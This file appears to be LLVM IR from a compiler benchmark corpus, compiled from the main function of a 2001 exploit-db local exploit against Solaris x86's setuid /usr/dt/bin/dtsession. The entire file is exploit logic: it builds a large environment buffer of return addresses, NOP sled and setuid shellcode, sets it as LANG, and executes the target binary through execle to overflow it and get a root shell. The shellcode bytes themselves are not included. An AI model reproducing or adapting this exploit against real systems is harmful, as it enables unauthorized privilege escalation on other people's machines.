; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20766.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20766.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM mar 2001 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [56 x i8] c"/usr/dt/bin/dtsession for solaris 2.7 (2.6,2.8 ?) x86\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"usage: %s xserver:display\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"xxx=\00", align 1
@PCHNUM = common dso_local global i32 0, align 4
@JMPNUM = common dso_local global i32 0, align 4
@NOPNUM = common dso_local global i32 0, align 4
@setuidshellcode = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [6 x i8] c"LANG=\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [22 x i8] c"/usr/dt/bin/dtsession\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [20000 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8], align 1
  %10 = alloca [4 x i8], align 1
  %11 = alloca [4 x i8*], align 16
  %12 = alloca [128 x i8], align 16
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i64, i64* @jump, align 8
  %26 = inttoptr i64 %25 to i32 (...)*
  %27 = call i32 (...) %26()
  %28 = add i32 %27, 3540
  %29 = add i32 %28, 3000
  %30 = sub i32 %29, 1232
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %32 = bitcast i8* %31 to i32*
  store i32 %30, i32* %32, align 1
  %33 = load i64, i64* @jump, align 8
  %34 = inttoptr i64 %33 to i32 (...)*
  %35 = call i32 (...) %34()
  %36 = add i32 %35, 3540
  %37 = add i32 %36, 3000
  %38 = add i32 %37, 6000
  %39 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %40 = bitcast i8* %39 to i32*
  store i32 %38, i32* %40, align 1
  %41 = load i64, i64* @jump, align 8
  %42 = inttoptr i64 %41 to i32 (...)*
  %43 = call i32 (...) %42()
  %44 = add i32 %43, 3540
  %45 = add i32 %44, 3000
  %46 = add i32 %45, 6000
  %47 = add i32 %46, 6000
  %48 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 0
  %49 = bitcast i8* %48 to i32*
  store i32 %47, i32* %49, align 1
  %50 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %51 = bitcast i8* %50 to i32*
  %52 = load i32, i32* %51, align 1
  store i32 %52, i32* %13, align 4
  %53 = lshr i32 %52, 8
  %54 = load i32, i32* %13, align 4
  %55 = shl i32 %54, 24
  %56 = or i32 %53, %55
  %57 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %58 = bitcast i8* %57 to i32*
  store i32 %56, i32* %58, align 1
  %59 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 (i8*, i8*, ...) @sprintf(i8* %59, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i8* %62)
  %64 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %65 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 0
  store i8* %64, i8** %65, align 16
  %66 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 19000
  %67 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 1
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i64 0, i64 0
  %69 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 2
  store i8* %68, i8** %69, align 16
  %70 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 3
  store i8* null, i8** %70, align 8
  %71 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  store i8* %71, i8** %7, align 8
  %72 = load i8*, i8** %7, align 8
  %73 = call i32 (i8*, i8*, ...) @sprintf(i8* %72, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %74 = load i8*, i8** %7, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 4
  store i8* %75, i8** %7, align 8
  store i32 0, i32* %13, align 4
  br label %76

76:                                               ; preds = %88, %24
  %77 = load i32, i32* %13, align 4
  %78 = load i32, i32* @PCHNUM, align 4
  %79 = icmp ult i32 %77, %78
  br i1 %79, label %80, label %91

80:                                               ; preds = %76
  %81 = load i32, i32* %13, align 4
  %82 = urem i32 %81, 4
  %83 = zext i32 %82 to i64
  %84 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %83
  %85 = load i8, i8* %84, align 1
  %86 = load i8*, i8** %7, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %7, align 8
  store i8 %85, i8* %86, align 1
  br label %88

88:                                               ; preds = %80
  %89 = load i32, i32* %13, align 4
  %90 = add i32 %89, 1
  store i32 %90, i32* %13, align 4
  br label %76

91:                                               ; preds = %76
  store i32 0, i32* %13, align 4
  br label %92

92:                                               ; preds = %104, %91
  %93 = load i32, i32* %13, align 4
  %94 = load i32, i32* @JMPNUM, align 4
  %95 = icmp ult i32 %93, %94
  br i1 %95, label %96, label %107

96:                                               ; preds = %92
  %97 = load i32, i32* %13, align 4
  %98 = urem i32 %97, 4
  %99 = zext i32 %98 to i64
  %100 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 %99
  %101 = load i8, i8* %100, align 1
  %102 = load i8*, i8** %7, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %7, align 8
  store i8 %101, i8* %102, align 1
  br label %104

104:                                              ; preds = %96
  %105 = load i32, i32* %13, align 4
  %106 = add i32 %105, 1
  store i32 %106, i32* %13, align 4
  br label %92

107:                                              ; preds = %92
  store i32 0, i32* %13, align 4
  br label %108

108:                                              ; preds = %115, %107
  %109 = load i32, i32* %13, align 4
  %110 = load i32, i32* @NOPNUM, align 4
  %111 = icmp ult i32 %109, %110
  br i1 %111, label %112, label %118

112:                                              ; preds = %108
  %113 = load i8*, i8** %7, align 8
  %114 = getelementptr inbounds i8, i8* %113, i32 1
  store i8* %114, i8** %7, align 8
  store i8 -112, i8* %113, align 1
  br label %115

115:                                              ; preds = %112
  %116 = load i32, i32* %13, align 4
  %117 = add i32 %116, 1
  store i32 %117, i32* %13, align 4
  br label %108

118:                                              ; preds = %108
  store i32 0, i32* %13, align 4
  br label %119

119:                                              ; preds = %133, %118
  %120 = load i32, i32* %13, align 4
  %121 = load i32*, i32** @setuidshellcode, align 8
  %122 = call i32 @strlen(i32* %121)
  %123 = icmp ult i32 %120, %122
  br i1 %123, label %124, label %136

124:                                              ; preds = %119
  %125 = load i32*, i32** @setuidshellcode, align 8
  %126 = load i32, i32* %13, align 4
  %127 = zext i32 %126 to i64
  %128 = getelementptr inbounds i32, i32* %125, i64 %127
  %129 = load i32, i32* %128, align 4
  %130 = trunc i32 %129 to i8
  %131 = load i8*, i8** %7, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %7, align 8
  store i8 %130, i8* %131, align 1
  br label %133

133:                                              ; preds = %124
  %134 = load i32, i32* %13, align 4
  %135 = add i32 %134, 1
  store i32 %135, i32* %13, align 4
  br label %119

136:                                              ; preds = %119
  %137 = load i8*, i8** %7, align 8
  store i8 0, i8* %137, align 1
  %138 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 19000
  store i8* %138, i8** %7, align 8
  %139 = load i8*, i8** %7, align 8
  %140 = call i32 (i8*, i8*, ...) @sprintf(i8* %139, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %141 = load i8*, i8** %7, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 5
  store i8* %142, i8** %7, align 8
  store i32 0, i32* %13, align 4
  br label %143

143:                                              ; preds = %155, %136
  %144 = load i32, i32* %13, align 4
  %145 = load i32, i32* @ADRNUM, align 4
  %146 = icmp ult i32 %144, %145
  br i1 %146, label %147, label %158

147:                                              ; preds = %143
  %148 = load i32, i32* %13, align 4
  %149 = urem i32 %148, 4
  %150 = zext i32 %149 to i64
  %151 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %150
  %152 = load i8, i8* %151, align 1
  %153 = load i8*, i8** %7, align 8
  %154 = getelementptr inbounds i8, i8* %153, i32 1
  store i8* %154, i8** %7, align 8
  store i8 %152, i8* %153, align 1
  br label %155

155:                                              ; preds = %147
  %156 = load i32, i32* %13, align 4
  %157 = add i32 %156, 1
  store i32 %157, i32* %13, align 4
  br label %143

158:                                              ; preds = %143
  %159 = load i8*, i8** %7, align 8
  store i8 0, i8* %159, align 1
  %160 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 0
  %161 = call i32 @execle(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 0, i8** %160)
  %162 = load i32, i32* %3, align 4
  ret i32 %162
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
